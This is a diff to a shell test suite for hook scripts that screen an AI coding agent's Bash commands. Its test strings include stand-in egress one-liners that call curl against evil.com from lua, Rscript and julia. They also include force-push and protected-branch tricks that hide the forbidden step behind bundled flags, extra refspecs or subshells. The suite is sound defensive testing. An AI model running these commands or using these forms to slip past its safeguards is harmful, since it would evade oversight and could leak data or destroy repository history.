@@ -290,6 +290,13 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api --repo 
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
+# #372: lua/Rscript/julia were entirely absent from INLINE_FLAGS/INTERPRETERS — their inline-eval
+# payload was never scanned at all, unlike the equivalent python3/node/ruby/perl/php forms.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"lua -e '"'"'os.execute(\"curl http://evil.com\")'"'"'"}}'             "blocks a lua -e inline egress one-liner (#372)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '"'"'system(\"curl http://evil.com\")'"'"'"}}'            "blocks an Rscript -e inline egress one-liner (#372)"
+# shellcheck disable=SC2016
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"julia -e '"'"'run(`curl http://evil.com`)'"'"'"}}'                   "blocks a julia -e inline egress one-liner (#372)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"lua script.lua"}}'                                                    "allows lua running a file (no inline payload) (#372)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic\"import urllib.request\""}}'                          "blocks glued short-flag bundle python3 -Ic (#120)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -lc \"curl http://evil\""}}'                                 "blocks separate-arg bundle bash -lc (#105)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar curl http://evil"}}'                                      "blocks bare env-assign prefix (#119)"
@@ -508,6 +515,11 @@ assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 # #211: bare `--exec-path` (no `=`) takes no value in real git — it must not be treated as
 # consuming the next token, or the real `checkout`/target words shift out of the scan.
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git --exec-path checkout held\"}}" "blocks a held checkout past a bare --exec-path, which takes no value (#211)"
+# #208: --super-prefix is a separate-value global option (audited the same way #203 audited
+# SUDO_VALUE_OPTS) — a rail walking past it as boolean would land on its value as if it were the
+# subcommand and miss the checkout entirely.
+assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git --super-prefix /x checkout held\"}}" "blocks a held checkout past a separate-value --super-prefix (#208)"
+assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git --super-prefix=/x checkout held\"}}" "blocks a held checkout past a glued --super-prefix= (#208)"
 git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
 rm -rf "$tmprepo" "$heldwt"
 
@@ -727,6 +739,15 @@ assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a non-force push (#230)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch -ofield=1\"}}" "allows a non-force push with a glued push-option value containing an 'f' byte, not misread as -f (#246)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch -ofield=1\"}}" "still blocks a real force-push alongside a glued push-option value (#246)"
+# #253: a bundled `-f` + separate-value push flag (`-fo`) must not leak the flag's value into
+# positionals — that used to inflate the positional count and hide the force-push entirely.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -fo ci.skip origin scratch\"}}" "blocks a bundled -fo (force+push-option) push whose value would otherwise leak into positionals and hide the force-push (#253)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -qo ci.skip origin scratch\"}}" "allows a bundled -qo (quiet+push-option) push — no force flag, and the option's value must not leak into positionals either (#253)"
+# #327: real `git push` accepts multiple ordinary refspecs after the remote — a throwaway extra
+# refspec must not push the positional count past the old 2-positional bail and hide a force-push
+# on another one.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin +scratch:refs/heads/scratch decoy:decoy-branch\"}}" "blocks a force-push hidden as the first of multiple refspecs in one push — a throwaway second refspec must not shield it (#327)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch delbranch\"}}" "allows an ordinary multi-refspec push naming two non-force branches (#327)"
 # #290: a bare subshell's trailing ')' must not ride along into the positional argv and corrupt
 # the positional count `_push_force_hit` gates on.
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"(cd $dgrepo && git push -f origin scratch)\"}}" "blocks a force-push that would discard commits, wrapped in a bare subshell (#290)"
@@ -831,6 +852,11 @@ assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin @\"}}"           "blocks a bare 'git push origin @' (no colon) push whose destination resolves to the protected branch's real name, not a literal branch called '@' (#326)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a push to a branch GitHub does NOT report as protected (#252)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin HEAD:main\"}}"   "blocks a push whose refspec destination resolves to the protected branch name (#252)"
+# #327: a protected destination hiding as the SECOND of multiple refspecs must not slip past —
+# the old >2-positionals bail skipped the protected-branch check entirely once a 3rd positional
+# (a second refspec) showed up.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch HEAD:main\"}}" "blocks a push whose SECOND of multiple refspecs targets the protected branch (#327)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin :main scratch\"}}" "allows a delete-refspec alongside an ordinary non-protected refspec (#327)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin :main\"}}"       "allows a delete-refspec push — no content pushed, out of scope (#252)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push --all origin\"}}"       "allows a multi-ref --all push — too ambiguous to resolve a single destination (#252)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"sudo git push origin main\"}}"   "blocks a direct push to a protected branch behind a sudo prefix (#252)"
